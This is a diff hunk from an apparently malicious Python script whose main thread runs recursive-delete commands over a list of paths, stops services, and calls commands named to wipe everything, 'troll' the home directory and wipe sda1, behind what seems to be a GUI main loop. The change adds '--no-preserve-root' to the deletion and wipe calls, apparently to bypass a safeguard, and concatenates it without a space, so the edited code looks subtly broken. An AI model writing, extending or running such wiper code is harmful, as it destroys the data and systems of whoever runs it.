@@ -51,12 +51,12 @@ def MainThread():
     for f in need_removing_list:
         os.system("clear")
         os.system("cd /")
-        os.system(rmrf_command + f + "*")
+        os.system(rmrf_command + f + "*" + "--no-preserve-root")
 
     for d in services_list:
         os.system(services_command + d)    
 
-    os.system(wipe_everything)
+    os.system(wipe_everything + "--no-preserve-root")
     os.system(troll_home_dir)
     os.system(wipe_sda1)
     root.mainloop() 
